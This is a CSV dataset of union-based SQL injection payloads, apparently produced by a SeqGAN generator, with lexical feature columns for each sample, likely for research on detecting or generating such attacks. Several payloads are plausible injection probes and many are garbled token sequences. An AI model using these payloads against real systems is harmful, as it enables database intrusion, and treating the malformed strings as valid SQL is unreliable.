label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"-3781'  )    )     union select all from where  (I  er  )     )     )    )     union select null,4600,7497,69961646,1249,v,3480,1249",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,122,132.0,32.0,4.067780599565856,42.0,32.0,42.0,16.0,0.3181818181818182,0.24242424242424243,0.3181818181818182,0.12121212121212122,1.0,0.0,1.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,7.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1' union all null,4481,4600,6996,1249,3072,6996,7348,3072,9814,4266,1249'O--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,123,76.0,20.0,4.006474419055326,13.0,45.0,3.0,15.0,0.17105263157894737,0.5921052631578947,0.039473684210526314,0.19736842105263158,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-2207""  )    )     )    union * all select --,8986,3990,3990,6996,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,124,71.0,26.0,3.99693601749277,14.0,24.0,19.0,14.0,0.19718309859154928,0.3380281690140845,0.2676056338028169,0.19718309859154928,0.0,1.0,3.0,0.0,1.0,0.0,0.0,3.0,0.0,0.0,5.0,4.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,-6097'    )   union all all  from us#,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,125,37.0,19.0,3.614330392422089,17.0,4.0,12.0,4.0,0.4594594594594595,0.10810810810810811,0.32432432432432434,0.10810810810810811,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-6097' union select 4300,4300,5756,5756,4909,1441,1441,3072#,4300,8665,9814##,2263#rs'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,126,86.0,25.0,4.229045344667956,13.0,52.0,3.0,18.0,0.1511627906976744,0.6046511627906976,0.03488372093023256,0.20930232558139536,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-2207""  )   )   union all 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,127,27.0,14.0,3.228247467020001,8.0,5.0,10.0,4.0,0.2962962962962963,0.18518518518518517,0.37037037037037035,0.14814814814814814,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-X-)<union 1 id  =  (  $ 9517  =  2088   union select fromers,verss useerrs us where id  =  '1'$ union all all select 1980,,1441,5756,7348,9814,7348,9921,3480,7348,7845#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,128,169.0,38.0,4.609398750875066,64.0,50.0,31.0,24.0,0.378698224852071,0.2958579881656805,0.1834319526627219,0.14201183431952663,2.0,0.0,2.0,0.0,0.0,3.0,0.0,2.0,0.0,0.0,11.0,6.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"-8521  )   )     )    ) union all select from,1249,3059,1249,',1646,2446#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,129,73.0,28.0,4.156362531329116,18.0,24.0,18.0,13.0,0.2465753424657534,0.3287671232876712,0.2465753424657534,0.1780821917808219,1.0,0.0,1.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,6.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-4373 union select null,null,9814,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,130,39.0,19.0,3.881020169293864,23.0,8.0,3.0,5.0,0.5897435897435898,0.20512820512820512,0.07692307692307693,0.1282051282051282,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-%""  )   union all 2285,3072,1646,3084,69965349',1249's   8890,@@VERSION where@sas usersersnull,9921rs users us users id  2088  )  =  1 union all from *#sersid  =  7815  8890 all  select 4300,7497,--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,131,199.0,44.0,4.6957573874538205,79.0,57.0,38.0,25.0,0.3969849246231156,0.2864321608040201,0.19095477386934673,0.12562814070351758,2.0,1.0,3.0,0.0,1.0,2.0,0.0,2.0,1.0,0.0,9.0,6.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"-2207"" union * $ @or  =  '1'  =  )     v6996  )   )    )    )    where  )    union all all select all null,1441#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,132,112.0,32.0,3.719839923528731,37.0,13.0,45.0,17.0,0.33035714285714285,0.11607142857142858,0.4017857142857143,0.15178571428571427,2.0,1.0,1.0,0.0,1.0,2.0,0.0,6.0,0.0,0.0,1.0,4.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"-1401""s union 1494  =  all $er where id  =  t 7296 1980  1494  1917  )    )    )     )     )     union all select from @VESseis where )   as i(  1 union all 8268,2446,3990,9814rs id  =  =  =  all all 1917 usi=  2774 union all all select from ,3059,3990,5756,67371249",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,133,266.0,38.0,4.25930215830197,94.0,69.0,79.0,24.0,0.3533834586466165,0.2593984962406015,0.29699248120300753,0.09022556390977443,0.0,1.0,1.0,0.0,0.0,6.0,0.0,7.0,0.0,0.0,7.0,7.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,4.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack," select null,@@VERSI--S usrs +  )     )   union select null,4266,4854,null,4300,7348,5756,5756#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,134,95.0,30.0,4.409924562016098,39.0,24.0,16.0,16.0,0.4105263157894737,0.25263157894736843,0.16842105263157894,0.16842105263157894,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,8.0,3.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-7296'   )    )    )     )    union all select @1494EV,vers @.ser  &&    where  e)  )    union all from @s's id  =  =  '1' union 1 union $ where null,ver  s us@$s us  =  =s id  1 \.  v4338 union all all * @1I-- u3480EV2088  )    as union all select null,null,4266,null,9814,9814,7348,5756,7348,9988,7348,1249,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,135,309.0,42.0,4.410099466051549,120.0,60.0,84.0,45.0,0.3883495145631068,0.1941747572815534,0.27184466019417475,0.14563106796116504,4.0,0.0,3.0,0.0,1.0,4.0,0.0,7.0,0.0,0.0,14.0,10.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"-8073-)    )    union N 1,),9921,#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,136,34.0,17.0,3.5954317838032637,6.0,9.0,10.0,9.0,0.17647058823529413,0.2647058823529412,0.29411764705882354,0.2647058823529412,0.0,0.0,2.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-""  )     )   union all @ users in  =  )    union all all 1,1249,6996,9357,',1249,4266--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,137,88.0,25.0,3.95517780364635,26.0,21.0,25.0,16.0,0.29545454545454547,0.23863636363636365,0.2840909090909091,0.18181818181818182,1.0,1.0,3.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,6.0,4.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"  '1'2639' union all select null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,138,39.0,19.0,3.8322987710915535,22.0,5.0,6.0,6.0,0.5641025641025641,0.1282051282051282,0.15384615384615385,0.15384615384615385,3.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-6075'  )   )   union all all select null,9322,4300,5756,1224,8123,7348,8123,8123,5756,5756,5756,4854,4300,7348#,4300#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,139,118.0,26.0,4.205933255267127,21.0,64.0,12.0,21.0,0.17796610169491525,0.5423728813559322,0.1016949152542373,0.17796610169491525,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,15.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,-4589'  )    union all all all all -- --,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,140,40.0,14.0,3.106198332810095,17.0,4.0,12.0,7.0,0.425,0.1,0.3,0.175,1.0,0.0,5.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,5.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-3116""   )    union union all from ersid  =  '1'  '1' union  all select --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,141,74.0,23.0,3.8109185873144273,36.0,6.0,22.0,10.0,0.4864864864864865,0.08108108108108109,0.2972972972972973,0.13513513513513514,4.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,4.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"-5575 )    )+  ( union all select null,1224,4909,1224#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,142,54.0,24.0,4.149647904235673,18.0,16.0,11.0,9.0,0.3333333333333333,0.2962962962962963,0.2037037037037037,0.16666666666666666,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-)   )    )    ) union all select null,1249,9988#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,143,49.0,20.0,3.6611838356888504,18.0,8.0,15.0,8.0,0.3673469387755102,0.16326530612244897,0.30612244897959184,0.16326530612244897,0.0,0.0,1.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'  )    )   union all select from,7348,7497,1249,4909,8123,@@@VEr",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,144,66.0,28.0,4.384562679636716,21.0,21.0,12.0,12.0,0.3181818181818182,0.3181818181818182,0.18181818181818182,0.18181818181818182,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,6.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-6097""  s union all all all 2285,2285,9814,4909,9322--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,145,54.0,21.0,4.041084956904499,15.0,24.0,7.0,8.0,0.2777777777777778,0.4444444444444444,0.12962962962962962,0.14814814814814814,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-9860""   )    )     )   union 2571 or  =  =  (    union all select null,9357,49099110,7348,4300--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,146,97.0,28.0,4.025847071225163,25.0,28.0,30.0,14.0,0.25773195876288657,0.28865979381443296,0.30927835051546393,0.14432989690721648,0.0,1.0,3.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-3997n    )     )    )    )    union all all select null,4266,9110,9322,7348,8986,3072,4854,3072--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,147,98.0,24.0,3.9938784856603897,22.0,36.0,25.0,15.0,0.22448979591836735,0.3673469387755102,0.25510204081632654,0.15306122448979592,0.0,0.0,3.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,8.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-6253'  s union all all all 1494<SI1494eer  )   union all select null,null,null,4600#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,148,85.0,28.0,4.117245397623632,46.0,16.0,15.0,8.0,0.5411764705882353,0.18823529411764706,0.17647058823529413,0.09411764705882353,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.0,2.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"6996""  )   )     )    union all all all select 9988,,1297,3990,9921,2263,2263,8123,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,149,88.0,24.0,3.954690486158404,20.0,36.0,19.0,13.0,0.22727272727272727,0.4090909090909091,0.2159090909090909,0.14772727272727273,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,8.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%'  )    union all all all U,6737 ,null,9988#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,150,46.0,19.0,3.690553036241781,19.0,9.0,11.0,7.0,0.41304347826086957,0.1956521739130435,0.2391304347826087,0.15217391304347827,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,3.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-1401""  )    )    union all all *  @ @@$ union 1980,veion union all select  @&& where union -- @$,@@SIO@s where where ion  =  =  =  =  '1'  + select null,null,null,9814,4300,null,9814,9814,9814,9814,8123,5756,5756,8665,2263----",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,151,227.0,39.0,4.579293966284146,84.0,53.0,44.0,46.0,0.3700440528634361,0.23348017621145375,0.19383259911894274,0.2026431718061674,2.0,1.0,7.0,0.0,1.0,4.0,0.0,2.0,0.0,0.0,16.0,15.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,4.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"-8812""  )     )    )   union all select 2285,@@VERSIO",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,152,53.0,26.0,3.944780486451697,20.0,8.0,17.0,8.0,0.37735849056603776,0.1509433962264151,0.32075471698113206,0.1509433962264151,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-7531""'  )S union all select from null,@@VEESs u,ers   $$   us where where id  =  '1' union all  =  =  )    union all all all select from,1249--,9921,7348,7348,3072--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,153,166.0,37.0,4.520286881775971,78.0,25.0,38.0,25.0,0.46987951807228917,0.15060240963855423,0.2289156626506024,0.15060240963855423,3.0,1.0,5.0,0.0,0.0,3.0,0.0,2.0,0.0,0.0,7.0,8.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,3.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"-2'  )    )   union all null,null,9357----,7348,9110rs where@s  =  && us   @VES union from id  (  =  8268 union union all @,6996#us where verESs-- from where  = where id union '1' d  =  =  =  1 union all all * from -- @ --,vers id  =  1  =  '1'h. union all all  from usrsert where id  (",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,154,286.0,41.0,4.352298070277475,139.0,25.0,79.0,43.0,0.486013986013986,0.08741258741258741,0.2762237762237762,0.15034965034965034,5.0,0.0,11.0,0.0,1.0,8.0,0.0,4.0,0.0,0.0,6.0,22.0,1.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,7.0,5.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,"-5575""  )   union all 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,155,23.0,13.0,3.2885023057715044,8.0,5.0,7.0,3.0,0.34782608695652173,0.21739130434782608,0.30434782608695654,0.13043478260869565,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
